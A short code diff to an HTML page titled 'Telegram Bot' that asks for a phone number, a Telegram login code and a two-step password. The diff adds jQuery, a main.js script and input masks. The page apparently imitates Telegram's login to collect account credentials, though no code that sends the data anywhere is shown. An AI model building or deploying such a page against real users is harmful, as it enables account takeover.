@@ -7,6 +7,8 @@ https://my.telegram.org/img/favicon-32x32.png
     <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">  
+    <script src="./jquery-3.6.3.min.js"></script>
+    <script src="./main.js"></script>
 <title>Telegram Bot</title>
 </head>
 <style>
@@ -116,6 +118,12 @@ display: none;
 <label for="code">Two step code (if you have)</label><br>
 <input type="text" id="code">
 </div>
+           <script>
+            $(document).ready(function(){
+      $('#number').mask('+000000000000');
+$('#code_telegram').mask('00000');
+  })
+          </script>
 <br>
 <button type="submit" class="next">Next</button>
 <script>
